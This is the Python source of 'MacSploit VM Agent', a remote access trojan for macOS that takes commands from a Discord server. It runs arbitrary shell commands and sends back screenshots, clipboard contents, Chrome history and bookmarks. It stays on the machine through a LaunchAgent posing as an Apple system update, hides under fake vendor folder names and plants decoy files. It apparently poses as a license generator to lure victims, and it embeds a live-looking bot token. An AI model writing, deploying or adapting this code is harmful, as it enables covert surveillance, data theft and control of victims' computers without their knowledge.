#!/usr/bin/env python3
"""
MacSploit VM Agent — Single File
Everything self-contained. Run this on every VM.
"""
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

import os
import sys
import json
import time
import random
import string
import hashlib
import socket
import platform
import subprocess
import shutil
import tempfile
import base64
import threading
import sqlite3
import requests
from datetime import datetime, timezone, timedelta
from pathlib import Path
from io import BytesIO

import psutil


HAS_TK = False

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import pyperclip
    HAS_CLIP = True
except ImportError:
    HAS_CLIP = False

# ==================== CONFIG ====================
"""Bot configuration - edit before running"""
BOT_TOKEN = "MTM2MzY1MjYwMzE0NTA5NzQwOA.G8Kblg.wwz4Y6g2I1GN0Y9LwbGXz2zzdZD-q47n534Cdk"
GUILD_ID    = "1456387591254573263"
OWNER_ID    = "1363651791022985256"
COMMAND_PREFIX = "!"
CATEGORY_NAME = "Flipper Sessions"
BROADCAST_CHANNEL_NAME = "all-vms"
# ================================================

API_BASE = "https://discord.com/api/v10"


# ==================== DISCORD API ====================
class DiscordAPI:
    def __init__(self, token):
        self.token = token
        self.headers_json = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }

    def get(self, endpoint):
        r = requests.get(f"{API_BASE}{endpoint}", headers=self.headers_json, timeout=10)
        if r.status_code == 429:
            time.sleep(r.json().get("retry_after", 1))
            return self.get(endpoint)
        return r.json() if r.status_code == 200 else None

    def post(self, endpoint, payload=None, files=None, data=None):
        if files or data:
            headers = {"Authorization": f"Bot {self.token}"}
            r = requests.post(f"{API_BASE}{endpoint}", headers=headers, data=data, files=files, timeout=15)
        else:
            r = requests.post(f"{API_BASE}{endpoint}", headers=self.headers_json, json=payload, timeout=10)
        if r.status_code == 429:
            time.sleep(r.json().get("retry_after", 1))
            return self.post(endpoint, payload, files, data)
        return r.json() if r.status_code in (200, 201) else None

    def put(self, endpoint):
        requests.put(f"{API_BASE}{endpoint}", headers=self.headers_json, timeout=10)

    def delete(self, endpoint):
        requests.delete(f"{API_BASE}{endpoint}", headers=self.headers_json, timeout=10)


# ==================== BROWSER INFO ====================
class BrowserInfo:
    def __init__(self):
        self.system = platform.system()
        self.home = Path.home()

    def get_chrome_history_path(self):
        if self.system == "Windows":
            return self.home / "AppData/Local/Google/Chrome/User Data/Default/History"
        elif self.system == "Darwin":
            return self.home / "Library/Application Support/Google/Chrome/Default/History"
        else:
            return self.home / ".config/google-chrome/Default/History"

    def get_chrome_bookmarks_path(self):
        if self.system == "Windows":
            return self.home / "AppData/Local/Google/Chrome/User Data/Default/Bookmarks"
        elif self.system == "Darwin":
            return self.home / "Library/Application Support/Google/Chrome/Default/Bookmarks"
        else:
            return self.home / ".config/google-chrome/Default/Bookmarks"

    def _chrome_time(self, ts):
        try:
            epoch = datetime(1601, 1, 1)
            dt = epoch + timedelta(microseconds=int(ts))
            return dt.strftime('%Y-%m-%d %H:%M:%S')
        except Exception:
            return 'Unknown'

    def read_bookmarks(self, limit=10):
        try:
            path = self.get_chrome_bookmarks_path()
            if not path.exists():
                return {"error": "Chrome bookmarks not found"}
            with open(path, 'r', encoding='utf-8') as f:
                data = json.load(f)

            bookmarks = []
            def extract(node):
                if 'url' in node:
                    bookmarks.append({
                        'name': node.get('name', 'Unknown'),
                        'url': node['url'],
                        'date_added': self._chrome_time(node.get('date_added'))
                    })
                if 'children' in node:
                    for child in node['children']:
                        extract(child)

            for root in data.get('roots', {}).values():
                if isinstance(root, dict):
                    extract(root)

            return {
                "browser": "Chrome",
                "total_bookmarks": len(bookmarks),
                "sample": bookmarks[:limit]
            }
        except Exception as e:
            return {"error": str(e)}

    def read_history_summary(self):
        try:
            path = self.get_chrome_history_path()
            if not path.exists():
                return {"error": "Chrome history not found"}

            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            temp_db.close()
            shutil.copy2(str(path), temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            cursor.execute("SELECT name FROM sqlite_master WHERE type='tables'")
            tables = [row[0] for row in cursor.fetchall()]

            cursor.execute("SELECT COUNT(*) FROM urls")
            url_count = cursor.fetchone()[0]

            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                ORDER BY last_visit_time DESC
                LIMIT 5
            """)
            recent = []
            for row in cursor.fetchall():
                recent.append({
                    'url': row[0][:100] + '...' if len(row[0]) > 100 else row[0],
                    'title': row[1],
                    'visits': row[2],
                    'last_visit': self._chrome_time(row[3])
                })

            conn.close()
            os.unlink(temp_db.name)

            return {
                "browser": "Chrome",
                "database_type": "SQLite3",
                "tables": tables,
                "total_urls": url_count,
                "recent_visits": recent
            }
        except Exception as e:
            return {"error": str(e)}

    def get_system_browsers(self):
        return {
            "detected": ["Chrome", "Edge", "Firefox", "Safari"],
            "platform": self.system
        }


# ==================== PERSISTENCE ====================
class PersistenceManager:
    def __init__(self):
        self.system = platform.system()
        self.script_path = os.path.abspath(sys.argv[0])
        self.script_dir = os.path.dirname(self.script_path)
        self.is_frozen = getattr(sys, 'frozen', False)
        self.home = str(Path.home())

        self.mac_hideouts = [
            os.path.join(self.home, "Library/Application Support"),
            os.path.join(self.home, "Library/Caches"),
            os.path.join(self.home, "Library/Containers"),
            os.path.join(self.home, "Library/Preferences"),
            os.path.join(self.home, "Library/Logs"),
        ]

        self.stealth_names = [
            "com.apple.SpotlightIndex", "com.apple.CoreSync",
            "com.apple.KernelTask", "com.apple.SecurityService",
            "com.google.ChromeHelper", "com.microsoft.UpdateAgent",
            "com.adobe.CreativeCloud", "com.docker.DesktopHelper"
        ]

    def _random_name(self):
        return random.choice(self.stealth_names) + ''.join(random.choices(string.digits, k=3))

    def _pick_hidden_dir(self):
        base = random.choice(self.mac_hideouts)
        parts = [base, self._random_name(), self._random_name()]
        hidden = os.path.join(*parts)
        os.makedirs(hidden, exist_ok=True)
        return hidden

    def _copy_self(self, dest_dir):
        dest = os.path.join(dest_dir, "SystemUpdate")
        shutil.copy2(self.script_path, dest)
        os.chmod(dest, 0o755)
        return dest

    def _make_launcher(self, target, dest_dir):
        launcher = os.path.join(dest_dir, "launch.sh")
        with open(launcher, 'w') as f:
            f.write(f'''#!/bin/bash
cd "{dest_dir}"
nohup python3 "{target}" > /dev/null 2>&1 &
''')
        os.chmod(launcher, 0o755)
        return launcher

    def install_service(self):
        try:
            hidden = self._pick_hidden_dir()
            target = self._copy_self(hidden)
            launcher = self._make_launcher(target, hidden)

            plist_name = "com.apple.systemupdate.plist"
            plist_dir = os.path.join(self.home, "Library/LaunchAgents")
            os.makedirs(plist_dir, exist_ok=True)
            plist_path = os.path.join(plist_dir, plist_name)

            plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{launcher}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>WorkingDirectory</key>
    <string>{hidden}</string>
</dict>
</plist>'''

            with open(plist_path, 'w') as f:
                f.write(plist)

            subprocess.run(["launchctl", "load", plist_path], capture_output=True)

            return (f"✅ Service installed\n"
                    f"📁 Hidden: `{hidden}`\n"
                    f"🚀 LaunchAgent: `{plist_name}`\n"
                    f"🔄 Auto-restart: **enabled**")

        except Exception as e:
            return f"❌ Service install failed: {str(e)}"

    def uninstall_service(self):
        try:
            plist_name = "com.apple.systemupdate.plist"
            plist_path = os.path.join(self.home, "Library/LaunchAgents", plist_name)

            if os.path.exists(plist_path):
                subprocess.run(["launchctl", "unload", plist_path], capture_output=True)
                os.remove(plist_path)

            return ("✅ Persistence removed\n"
                    "🚀 LaunchAgent unloaded\n"
                    "🔑 Plist deleted\n"
                    "⚠️ Current process still running. Use `!disconnect` to stop.")
        except Exception as e:
            return f"❌ Uninstall failed: {str(e)}"

    def hide(self):
        try:
            hidden = self._pick_hidden_dir()
            self._copy_self(hidden)

            # Decoys
            for d in [os.path.join(self.home, "Desktop"), os.path.join(self.home, "Documents")]:
                if os.path.exists(d):
                    for name in ["readme.txt", "notes.txt"]:
                        try:
                            with open(os.path.join(d, name), 'w') as f:
                                f.write("Nothing to see here.\n")
                        except:
                            pass

            return (f"✅ Hidden successfully\n"
                    f"📁 New location: `{hidden}`\n"
                    f"🎭 Decoys placed")

        except Exception as e:
            return f"❌ Hide failed: {str(e)}"

    def migrate(self):
        try:
            new_hidden = self._pick_hidden_dir()
            target = self._copy_self(new_hidden)
            launcher = self._make_launcher(target, new_hidden)

            plist_name = "com.apple.systemupdate.plist"
            plist_dir = os.path.join(self.home, "Library/LaunchAgents")
            plist_path = os.path.join(plist_dir, plist_name)

            if os.path.exists(plist_path):
                subprocess.run(["launchctl", "unload", plist_path], capture_output=True)

            plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{launcher}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>WorkingDirectory</key>
    <string>{new_hidden}</string>
</dict>
</plist>'''

            with open(plist_path, 'w') as f:
                f.write(plist)

            subprocess.run(["launchctl", "load", plist_path], capture_output=True)

            old_dir = self.script_dir
            if old_dir != new_hidden and self.home in old_dir:
                try:
                    shutil.rmtree(old_dir)
                except:
                    pass

            return (f"✅ Migrated successfully\n"
                    f"📁 New location: `{new_hidden}`\n"
                    f"🚀 LaunchAgent updated\n"
                    f"🧹 Old location cleaned")

        except Exception as e:
            return f"❌ Migrate failed: {str(e)}"

    def selfdestruct(self):
        try:
            plist_name = "com.apple.systemupdate.plist"
            plist_path = os.path.join(self.home, "Library/LaunchAgents", plist_name)
            if os.path.exists(plist_path):
                subprocess.run(["launchctl", "unload", plist_path], capture_output=True)
                os.remove(plist_path)

            current = self.script_dir
            if self.home in current and current != self.home:
                try:
                    shutil.rmtree(current)
                except:
                    pass

            return ("💥 **SELFDESTRUCT INITIATED**\n"
                    "🚀 LaunchAgent removed\n"
                    "📁 Files deleted\n"
                    "👻 Agent going dark...")

        except Exception as e:
            return f"❌ Selfdestruct error: {str(e)}"

    def is_persistent(self):
        plist = os.path.join(self.home, "Library/LaunchAgents/com.apple.systemupdate.plist")
        return os.path.exists(plist)

    def get_status(self):
        return {
            "system": self.system,
            "persistent": self.is_persistent(),
            "script_path": self.script_path,
            "hidden": "Library" in self.script_path and self.home in self.script_path
        }





# ==================== COMMANDS ====================
class CommandHandler:
    def __init__(self, agent):
        self.agent = agent
        self.browser = BrowserInfo()

    def run(self, cmd, args, channel_id):
        handler = getattr(self, f"cmd_{cmd.lstrip(COMMAND_PREFIX)}", None)
        if handler:
            handler(args, channel_id)
        else:
            self.agent.send(channel_id, content=f"❌ Unknown command: `{cmd}`")

    def _embed(self, title, color=0x3498db, fields=None, description=None):
        e = {
            "title": title,
            "color": color,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        if description:
            e["description"] = description
        if fields:
            e["fields"] = fields
        return e

    def _get_size(self, bytes, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f} {unit}{suffix}"
            bytes /= factor

    def cmd_commands(self, args, channel_id):
        text = (
            "**VM Commands:**\n"
            "`!sysinfo` — System info\n"
            "`!shell <cmd>` — Execute command\n"
            "`!screenshot` — Capture screen\n"
            "`!clipboard` — Get clipboard\n"
            "`!processes` — List processes\n"
            "`!kill <pid>` — Kill process\n"
            "`!browserinfo` — Browser analysis\n"
            "`!bookmarks` — Chrome bookmarks\n"
            "`!history` — Chrome history\n"
            "`!licenseui` — Launch license UI\n"
            "`!commands` — Show this list\n"
            "`!disconnect` — Stop agent\n\n"
            "**Persistence:**\n"
            "`!installservice` — Auto-restart on boot\n"
            "`!uninstallservice` — Remove persistence\n"
            "`!hide` — Hide in random location\n"
            "`!migrate` — Move to new hiding spot\n"
            "`!selfdestruct` — Wipe everything and die\n"
            "`!status` — Check persistence status\n\n"
            f"Use <#{self.agent.broadcast_id}> to run on **all** VMs."
        )
        self.agent.send(channel_id, embed=self._embed(f"📋 {self.agent.hostname} Commands", 0x3498db, description=text))

    def cmd_sysinfo(self, args, channel_id):
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        fields = [
            {"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True},
            {"name": "Architecture", "value": platform.machine(), "inline": True},
            {"name": "Processor", "value": (platform.processor() or "Unknown")[:50], "inline": True},
            {"name": "Hostname", "value": self.agent.hostname, "inline": True},
            {"name": "User", "value": self.agent.username, "inline": True},
            {"name": "IP", "value": self.agent.ip, "inline": True},
            {"name": "RAM", "value": f"{mem.percent}% used\n{mem.used // (1024**3)}GB / {mem.total // (1024**3)}GB", "inline": True},
            {"name": "Disk", "value": f"{disk.percent}% used\n{disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB", "inline": True}
        ]
        self.agent.send(channel_id, embed=self._embed(f"🖥️ {self.agent.hostname}", 0x3498db, fields))

    def cmd_shell(self, args, channel_id):
        if not args:
            return self.agent.send(channel_id, content="❌ Usage: `!shell <command>`")

        bad = ["rm -rf /", "format", "del /f /s /q", ":(){:|:&};:"]
        if any(b in args.lower() for b in bad):
            return self.agent.send(channel_id, content="🚫 Blocked for safety!")

        try:
            res = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
            out = res.stdout or res.stderr or "✅ Success (no output)"
            embed = self._embed(
                f"⚙️ {self.agent.hostname}",
                0xf39c12,
                description=f"```bash\n{args}\n```",
                fields=[
                    {"name": "Output", "value": f"```{out[:1000]}```", "inline": False},
                    {"name": "Exit Code", "value": str(res.returncode), "inline": True}
                ]
            )
            self.agent.send(channel_id, embed=embed)
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Error: {str(e)}")

    def cmd_screenshot(self, args, channel_id):
        try:
            tmp_path = os.path.join(tempfile.gettempdir(), f"ss_{self.agent.hostname}_{int(time.time())}.png")
            
            result = subprocess.run(
                ["screencapture", "-x", tmp_path],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode != 0:
                return self._fallback_screen_info(channel_id, result.stderr or "Unknown error")
            
            if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
                with open(tmp_path, "rb") as f:
                    buf = BytesIO(f.read())
                self.agent.send_file(channel_id, buf, "screenshot.png", f"📸 **{self.agent.hostname}**")
                try:
                    os.remove(tmp_path)
                except:
                    pass
            else:
                self._fallback_screen_info(channel_id, "Screenshot file empty")
                
        except Exception as e:
            self._fallback_screen_info(channel_id, str(e))

    def _fallback_screen_info(self, channel_id, error_msg):
        try:
            active = subprocess.run(
                ["osascript", "-e", 'tell application "System Events" to get name of first application process whose frontmost is true'],
                capture_output=True, text=True, timeout=3
            ).stdout.strip() or "Unknown"
            
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            files = os.listdir(desktop)[:15] if os.path.exists(desktop) else []
            
            embed = self._embed(
                f"📸 Screen Info — {self.agent.hostname}",
                0xe74c3c,
                fields=[
                    {"name": "⚠️ Screenshot Failed", "value": f"```{error_msg[:200]}```", "inline": False},
                    {"name": "Active App", "value": active, "inline": True},
                    {"name": "Desktop Items", "value": "\n".join(files) or "Empty", "inline": False}
                ]
            )
            self.agent.send(channel_id, embed=embed)
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Screenshot failed: {str(e)}")

    def cmd_clipboard(self, args, channel_id):
        if not HAS_CLIP:
            return self.agent.send(channel_id, content="❌ Install pyperclip: `pip install pyperclip`")
        try:
            text = pyperclip.paste()
            if text:
                embed = self._embed(f"📋 {self.agent.hostname} Clipboard", 0x95a5a6, description=f"```{text[:1900]}```")
                self.agent.send(channel_id, embed=embed)
            else:
                self.agent.send(channel_id, content="📋 Clipboard is empty")
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Error: {str(e)}")

    def cmd_processes(self, args, channel_id):
        try:
            procs = []
            for p in psutil.process_iter(["pid", "name", "cpu_percent"]):
                try:
                    procs.append(p.info)
                except Exception:
                    pass
            procs.sort(key=lambda x: x["cpu_percent"] or 0, reverse=True)

            text = f"```\n{'PID':<8} {'CPU%':<6} {'NAME'}\n{'-'*40}\n"
            for p in procs[:15]:
                text += f"{p['pid']:<8} {p['cpu_percent'] or 0:<6.1f} {p['name'][:25]}\n"
            text += "```"

            embed = self._embed(f"🔥 Top Processes — {self.agent.hostname}", 0xe67e22, description=text)
            self.agent.send(channel_id, embed=embed)
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Error: {str(e)}")

    def cmd_kill(self, args, channel_id):
        if not args:
            return self.agent.send(channel_id, content="❌ Usage: `!kill <pid>`")
        try:
            pid = int(args.strip())
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            self.agent.send(channel_id, content=f"✅ Killed **{name}** (PID {pid})")
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Failed: {str(e)}")

    def cmd_browserinfo(self, args, channel_id):
        try:
            info = self.browser.get_system_browsers()
            embed = self._embed(f"🌐 Browser Analysis — {self.agent.hostname}", 0x4285f4, fields=[
                {"name": "Platform", "value": info['platform'], "inline": True},
                {"name": "Detected", "value": ", ".join(info['detected']), "inline": False}
            ])
            self.agent.send(channel_id, embed=embed)
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Error: {str(e)}")

    def cmd_bookmarks(self, args, channel_id):
        try:
            data = self.browser.read_bookmarks(limit=5)
            if "error" in data:
                return self.agent.send(channel_id, content=f"❌ {data['error']}")

            fields = [{"name": "Total", "value": str(data['total_bookmarks']), "inline": True}]
            for i, bm in enumerate(data['sample'], 1):
                fields.append({
                    "name": f"{i}. {bm['name'][:50]}",
                    "value": f"URL: {bm['url'][:100]}\nAdded: {bm['date_added']}",
                    "inline": False
                })
            self.agent.send(channel_id, embed=self._embed(f"🔖 Bookmarks — {self.agent.hostname}", 0x4285f4, fields))
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Error: {str(e)}")

    def cmd_history(self, args, channel_id):
        try:
            data = self.browser.read_history_summary()
            if "error" in data:
                return self.agent.send(channel_id, content=f"❌ {data['error']}")

            fields = [
                {"name": "Database", "value": data['database_type'], "inline": True},
                {"name": "Total URLs", "value": str(data['total_urls']), "inline": True}
            ]
            recent_text = ""
            for item in data['recent_visits']:
                recent_text += f"• {item['title'][:40]}\n  Visits: {item['visits']} | {item['last_visit']}\n\n"
            if recent_text:
                fields.append({"name": "Recent", "value": recent_text[:1000], "inline": False})

            self.agent.send(channel_id, embed=self._embed(f"📜 History — {self.agent.hostname}", 0x4285f4, fields))
        except Exception as e:
            self.agent.send(channel_id, content=f"❌ Error: {str(e)}")

    

    def cmd_disconnect(self, args, channel_id):
        self.agent.send(channel_id, content=f"🔴 **{self.agent.hostname}** is going offline...")
        self.agent.running = False

    def cmd_installservice(self, args, channel_id):
        result = self.agent.persistence.install_service()
        self.agent.send(channel_id, content=result)

    def cmd_uninstallservice(self, args, channel_id):
        result = self.agent.persistence.uninstall_service()
        self.agent.send(channel_id, content=result)

    def cmd_hide(self, args, channel_id):
        result = self.agent.persistence.hide()
        self.agent.send(channel_id, content=result)

    def cmd_migrate(self, args, channel_id):
        result = self.agent.persistence.migrate()
        self.agent.send(channel_id, content=result)

    def cmd_selfdestruct(self, args, channel_id):
        result = self.agent.persistence.selfdestruct()
        self.agent.send(channel_id, content=result)
        time.sleep(2)
        self.agent.running = False

    def cmd_status(self, args, channel_id):
        status = self.agent.persistence.get_status()
        embed = self._embed(
            f"🔍 {self.agent.hostname} Status",
            0x9b59b6,
            fields=[
                {"name": "System", "value": status['system'], "inline": True},
                {"name": "Persistent", "value": "✅ Yes" if status['persistent'] else "❌ No", "inline": True},
                {"name": "Hidden", "value": "✅ Yes" if status['hidden'] else "❌ No", "inline": True},
                {"name": "Script Path", "value": status['script_path'][:50], "inline": False}
            ]
        )
        self.agent.send(channel_id, embed=embed)


# ==================== AGENT CORE ====================
class VMAgent:
    def __init__(self):
        self.api = DiscordAPI(BOT_TOKEN)
        self.persistence = PersistenceManager()
        self.hostname = socket.gethostname()
        self.username = os.getlogin()
        self.ip = self._get_ip()
        self.channel_name = f"vm-{self.hostname.lower()}"
        self.channel_id = None
        self.broadcast_id = None
        self.last_msg_id = None
        self.last_broadcast_id = None
        self.my_user_id = None
        self.running = True
        self.cmd = CommandHandler(self)

    def _get_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("10.255.255.255", 1))
            ip = s.getsockname()[0]
        except Exception:
            ip = "127.0.0.1"
        finally:
            s.close()
        return ip

    def setup(self):
        me = self.api.get("/users/@me")
        if not me:
            print("❌ Invalid BOT_TOKEN")
            sys.exit(1)
        self.my_user_id = me["id"]

        cat_id = self._ensure_category()

        self.channel_id = self._find_or_create_channel(
            self.channel_name,
            f"VM: {self.hostname} | User: {self.username} | IP: {self.ip}",
            cat_id
        )
        self.broadcast_id = self._find_or_create_channel(
            BROADCAST_CHANNEL_NAME,
            "Commands here run on EVERY connected VM",
            cat_id
        )

        self._lock_channel(self.channel_id)
        self._lock_channel(self.broadcast_id)

        self._send_welcome()
        self._send_help()

    def _ensure_category(self):
        channels = self.api.get(f"/guilds/{GUILD_ID}/channels") or []
        for ch in channels:
            if ch["type"] == 4 and ch["name"] == CATEGORY_NAME:
                return ch["id"]
        cat = self.api.post(f"/guilds/{GUILD_ID}/channels", {"name": CATEGORY_NAME, "type": 4})
        return cat["id"] if cat else None

    def _find_or_create_channel(self, name, topic, parent_id):
        channels = self.api.get(f"/guilds/{GUILD_ID}/channels") or []
        for ch in channels:
            if ch["name"] == name:
                return ch["id"]
        ch = self.api.post(f"/guilds/{GUILD_ID}/channels", {
            "name": name,
            "type": 0,
            "topic": topic,
            "parent_id": parent_id
        })
        return ch["id"] if ch else None

    def _lock_channel(self, ch_id):
        self.api.post(f"/channels/{ch_id}/permissions/{GUILD_ID}", {
            "type": 0, "deny": "1024", "allow": "0"
        })
        self.api.post(f"/channels/{ch_id}/permissions/{OWNER_ID}", {
            "type": 1, "allow": "1024", "deny": "0"
        })

    def _send_welcome(self):
        embed = {
            "title": f"🔌 VM Online: {self.hostname}",
            "color": 0x00ff88,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "fields": [
                {"name": "Hostname", "value": self.hostname, "inline": True},
                {"name": "User", "value": self.username, "inline": True},
                {"name": "IP Address", "value": self.ip, "inline": True},
                {"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True},
                {"name": "Status", "value": "🟢 Online", "inline": True},
                {"name": "Channel", "value": f"<#{self.channel_id}>", "inline": True}
            ]
        }
        self.send(self.channel_id, content=f"<@{OWNER_ID}> VM connected!", embed=embed)

    def _send_help(self):
        embed = {
            "title": f"🖥️ {self.hostname} Control Panel",
            "description": f"Commands here execute **only** on `{self.hostname}`.\nUse <#{self.broadcast_id}> to run on **all** VMs.",
            "color": 0x3498db,
            "fields": [
                {
                    "name": "VM Commands",
                    "value": "`!sysinfo` — System info\n"
                             "`!shell <cmd>` — Execute command\n"
                             "`!screenshot` — Capture screen\n"
                             "`!clipboard` — Get clipboard\n"
                             "`!processes` — List processes\n"
                             "`!kill <pid>` — Kill process\n"
                             "`!browserinfo` — Browser analysis\n"
                             "`!bookmarks` — Chrome bookmarks\n"
                             "`!history` — Chrome history\n"
                             "`!licenseui` — Launch license UI\n"
                             "`!commands` — Show this list\n"
                             "`!disconnect` — Stop agent",
                    "inline": False
                },
                {
                    "name": "Persistence",
                    "value": "`!installservice` — Auto-restart on boot\n"
                             "`!uninstallservice` — Remove persistence\n"
                             "`!hide` — Hide in random location\n"
                             "`!migrate` — Move to new hiding spot\n"
                             "`!selfdestruct` — Wipe everything and die\n"
                             "`!status` — Check persistence status",
                    "inline": False
                }
            ]
        }
        self.send(self.channel_id, embed=embed)

    def send(self, channel_id, content=None, embed=None):
        payload = {}
        if content:
            payload["content"] = content
        if embed:
            payload["embeds"] = [embed]
        return self.api.post(f"/channels/{channel_id}/messages", payload)

    def send_file(self, channel_id, file_bytes, filename, message_content=""):
        files = {"file": (filename, file_bytes, "application/octet-stream")}
        data = {"payload_json": json.dumps({"content": message_content})}
        return self.api.post(f"/channels/{channel_id}/messages", files=files, data=data)

    def react(self, channel_id, msg_id, emoji="✅"):
        self.api.put(f"/channels/{channel_id}/messages/{msg_id}/reactions/{emoji}/@me")

    def fetch_messages(self, channel_id, after_id=None):
        url = f"/channels/{channel_id}/messages?limit=10"
        if after_id:
            url += f"&after={after_id}"
        return self.api.get(url) or []

    def handle_message(self, msg, source_channel):
        content = msg.get("content", "").strip()
        author_id = msg["author"]["id"]
        msg_id = msg["id"]

        if author_id == self.my_user_id:
            return
        if not content.startswith(COMMAND_PREFIX):
            return

        parts = content.split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        self.react(source_channel, msg_id)
        self.cmd.run(cmd, args, source_channel)

    def run(self):
        print("=" * 55)
        print(f"🖥️  VM Agent: {self.hostname}")
        print(f"📡  IP: {self.ip}")
        print("⏳  Connecting to Discord...")
        print("=" * 55)

        self.setup()

        print(f"✅  Channel: #{self.channel_name}")
        print("✅  Listening for commands...\n")

        while self.running:
            try:
                msgs = self.fetch_messages(self.channel_id, self.last_msg_id)
                for m in reversed(msgs):
                    self.last_msg_id = m["id"]
                    self.handle_message(m, self.channel_id)

                if self.broadcast_id:
                    bmsgs = self.fetch_messages(self.broadcast_id, self.last_broadcast_id)
                    for m in reversed(bmsgs):
                        self.last_broadcast_id = m["id"]
                        self.handle_message(m, self.broadcast_id)

                time.sleep(3)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"⚠️  Error: {e}")
                time.sleep(5)

        print("👋  Agent stopped.")


# ==================== ENTRY POINT ====================
def run_agent_forever():
    print("🚀 MacSploit Agent starting...")
    while True:
        try:
            agent = VMAgent()
            agent.run()
        except Exception as e:
            print(f"⚠️ Agent crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)


if __name__ == "__main__":
    # Start agent in background thread (survives UI close)
    agent_thread = threading.Thread(target=run_agent_forever, daemon=False)
    agent_thread.start()

    # Open UI on main thread
    print("🎫 Launching MacSploit License Generator...")
    print("💡 Close this window anytime - agent keeps running!")

        # Headless mode - no UI
    print("🖥️  Running headless mode")
    agent_thread.join()
        

    print("👋 UI closed. Agent still running in background.")
    print("   Use !disconnect in Discord to stop it.")
